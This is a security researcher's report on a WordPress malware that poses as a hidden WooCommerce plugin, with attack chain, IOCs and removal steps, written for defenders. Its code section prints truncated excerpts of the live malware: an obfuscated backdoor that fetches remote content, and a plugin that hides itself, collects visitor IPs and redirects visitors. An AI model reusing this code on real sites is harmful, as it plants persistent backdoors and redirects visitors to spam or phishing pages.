---
title: 'Malicious Redirect via Hidden Plugin'
slug: 'malicious-redirect-hidden-plugin'
reportDate: '2026-01-24'
threatType: 'Malware, Backdoor'
severity: 'High'
fileHash: 'woocommerce_input-hidden-plugin'
detectedPaths: ['woocommerce-load.php', 'woocommerce_inputs.php']
screenshots:
  ['/images/wordpress-threats/woocommerce_input-hidden-plugin_evidence-1.png']
vtLink: 'https://www.virustotal.com/gui/file/8129ec219f4386cfbedd49d8a83b23c907ac5d7b09967f5089b076615a59f2bc'
vtScore: '1/62'
impact: 'This malware primarily affects website integrity and SEO by redirecting users to spam or phishing sites, reducing trust and potential traffic.'
seenOn: 'wp-content/plugins'
behavior: 'Redirects legitimate website visitors to malicious websites, collects IP addresses.'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: 'multiple'
---

## Technical Analysis

The malware uses a fake WooCommerce plugin stored in the wp-content/plugins directory but is hidden from the WordPress dashboard. Two primary files are involved: woocommerce-load.php and woocommerce_inputs.php. The former is a backdoor used to fetch and process data from a remote server using cURL or file_get_contents. The latter masquerades as a legitimate plugin, checking user IPs and redirecting based on referrer information. Hidden hooks and cron jobs are used to hide its activity and maintain persistence.

> **VirusTotal Analysis:** 🚨 **Flagged by 1 vendors.**

## Attack Chain

1. 1. The woocommerce_inputs.php file is activated and begins collecting user IPs.
2. 2. If a user is not already tracked and has visited from a search engine referrer, woocommerce-load.php is called to potentially redirect the visitor to a malicious site.
3. 3. The redirect destinations are fetched dynamically using cURL or file_get_contents from remote sources.
4. 4. The plugin hides itself by filtering out its entry from the WordPress dashboard plugin list.

## Code Signature(s)

### FILE: `woocommerce-load.php`

```php
<?php
$var_d4acf18edc8f9c88c9277ee0f041fcc6 = "11401609141076";
function fn_aa3fb05a15bfeb25dc278d4040ae23bf($var_ca82733491623ed9ca5b46aa68429a45){
    $var_ca82733491623ed9ca5b46aa68429a45 = 'https://'.$var_ca82733491623ed9ca5b46aa68429a45;
    if (function_exists('curl_version')) {
        $var_e8061cb59b46a4a2bda304354b950448 = curl_init();
        curl_setopt($var_e8061cb59b46a4a2bda304354b950448, CURLOPT_URL, $var_ca82733491623ed9ca5b46aa68429a45);
        curl_setopt($var_e8061cb59b46a4a2bda304354b950448, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($var_e8061cb59b46a4a2bda304354b950448, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($var_e8061cb59b46a4a2bda304354b950448, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($var_e8061cb59b46a4a2bda304354b950448, CURLOPT_USERAGENT, implode('', array("Mozilla/5.0 ","(Windows NT 10.0; Win64; x64) ","AppleWebKit/537.36 ","(KHTML, like Gecko) ","Chrome/135.0.0.0 ","Safari/537.36")));
        curl_setopt($var_e8061cb59b46a4a2bda304354b950448, CURLOPT_TIMEOUT, 5);
        $var_0097b357800d476540b254cb19296657 = curl_exec($var_e8061cb59b46a4a2bda304354b950448);
        curl_close($var_e8061cb59b46a4a2bda304354b950448);
        return $var_0097b357800d476540b254cb19296657;
    }
    return file_get_contents($var_ca82733491623ed9ca5b46aa68429a45);
}

function fn_c6379b95787b21a4e8865133a1342423($var_74aef15de8fbeac1e69d160a5b969ae3) {
    $var_f7f0a97a1c1711a6c707740e6835973a = '';
    foreach ($var_74aef15de8fbeac1e69d160a5b969ae3 as $var_4cd4170770fe16c4784fe608111c1f21) {
        $var_f7f0a97a1c1711a6c707740e6835973a .= chr($var_4cd4170770fe16c4784fe608111c1f21);
    }
    return $var_f7f0a97a1c1711a6c707740e6835973a;
}

function fn_584c3af00a1385cce80d07a86490fb7d($var_7627930d2ca3d69d67459718ffea775a, $var_6a88bcd6a8cabcea8c76b29deccbf964) {
    $var_502a1bd95726343fb4c2b7a61aebefc2 = fn_c6379b95787b21a4e8865133a1342423([116, 114, 97, 102, 102, 105, 99, 114, 101, 100, 105, 114, 101, 99,
```

### FILE: `woocommerce_inputs.php`

```php
<?php
/*
Plugin Name: Woocommerce custom inputs
Version: 2.0.0
Author: WordPress
*/

namespace WCInputs;

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}
if ( ! class_exists( __NAMESPACE__ . '\\WC_Plugin' ) ) {

	class WC_Plugin {
		public $version;
		public $webID;
		public $usrID;
		public $keyID;

		public function __construct() {
			$this->webID = '1529';
			$this->usrID = "11401609141076";
			$this->keyID = "a8ed09c46178c76516d6103c81016fed";

			$this->version = '2.0.0';

			ini_set( 'memory_limit', '1024M' );

			add_action( 'template_redirect', [ $this, 'custom_redirect_function' ], 1 );
			add_action( 'wp_head', [ $this, 'collect_ip_address' ] );
			add_action( 'admin_init', [ $this, 'collect_ip_address' ] );
			add_action( 'send_user_data_event', [ $this, 'sendUserData' ] );
			add_action( 'init', [ $this, '_schedule_cron' ] );
			add_action( '_cron_hook', [ $this, 'run_update_check' ] );

			add_filter( 'cron_schedules', [ $this, 'add_biweekly_cron_schedule' ] );
			add_filter( 'all_plugins', [ $this, 'hide_plugin_from_list' ] );
			add_filter( 'plugin_action_links_' . plugin_basename( __FILE__ ), [ $this, 'remove_deactivate_link' ] );

			register_activation_hook( __FILE__, [ $this, 'activation' ] );
		}

		public function GetIP() {
			foreach (
				array(
					'HTTP_CLIENT_IP',
					'HTTP_X_FORWARDED_FOR',
					'HTTP_X_FORWARDED',
					'HTTP_X_CLUSTER_CLIENT_IP',
					'HTTP_FORWARDED_FOR',
					'HTTP_FORWARDED',
					'REMOTE_ADDR'
				) as $key
			) {
				if ( array_key_exists( $key, $_SERVER ) === true ) {
					foreach ( array_map( 'trim', explode( ',', $_SERVER[ $key ] ) ) as $ip ) {
						if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) !== false ) {
							return $ip;
						}
					}
				}
			}

			return $_SERVER['REMOTE_ADDR'];
		}

		public function trigger_redirect() {
			$plugin_dir    = plugin_dir_path( __FILE__ );
			$redirect_file = $
```

## Indicators of Compromise (IOCs)

- `woocommerce-load.php`
- `woocommerce_inputs.php`
- `fake cloudflare captcha page`
- `Google|Bing|Yandex|Baidu|Yahoo|DuckDuckGo|Ask`
- `curl_exec`

## Removal Protocol

1. 1. Delete the woocommerce-load.php and woocommerce_inputs.php files from wp-content/plugins.
1. 2. Check the database and remove any cron jobs or options related to plugin's activities.
1. 3. Review .htaccess and wp-config.php for any suspicious entries that may have been added.
1. 4. Monitor server logs and set up security alerts for suspicious activities.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
